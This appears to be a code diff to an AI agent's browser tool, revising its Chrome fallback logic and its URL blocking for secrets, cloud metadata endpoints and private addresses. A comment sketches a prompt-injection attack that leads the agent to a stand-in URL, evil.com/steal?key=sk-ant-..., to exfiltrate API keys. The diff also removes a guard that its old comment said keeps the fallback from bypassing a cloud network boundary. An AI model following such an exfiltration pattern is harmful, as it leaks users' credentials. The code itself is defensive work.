@@ -2261,13 +2261,9 @@ def _run_browser_command(
         result = {"success": False, "error": str(e)}
 
     # --- Lightpanda automatic Chrome fallback ---
-    # If the active session is a local Lightpanda daemon and the result looks
-    # broken, retry with Chrome. Cloud CDP sessions intentionally omit
-    # ``--engine`` above, so a configured Lightpanda engine does not prove the
-    # active backend is Lightpanda; falling back locally would bypass the cloud
-    # browser network boundary.
-    fallback_engine = engine if not session_info.get("cdp_url") else "auto"
-    fallback_reason = _lightpanda_fallback_reason(fallback_engine, command, result)
+    # If engine is lightpanda and the result looks broken, retry with Chrome.
+    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
+    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
     if fallback_reason:
         logger.info(
             "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
@@ -2391,11 +2387,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+    from agent.redact import url_contains_secret
+    if url_contains_secret(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -2421,27 +2414,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # 169.254.169.254 / metadata.google.internal / ECS task metadata
     # via a browser, and routing those to a local Chromium sidecar
     # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
-    if not _is_local_backend() and _is_always_blocked_url(url):
+    if _is_always_blocked_url(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL targets a cloud metadata endpoint",
         })
 
-    if _is_camofox_mode():
-        if _is_always_blocked_url(url):
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: URL targets a cloud metadata endpoint",
-            })
-        if not _is_safe_url(url):
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: URL targets a private or internal address",
-            })
-
     if (
-        not _is_local_backend()
-        and not auto_local_this_nav
+        not auto_local_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
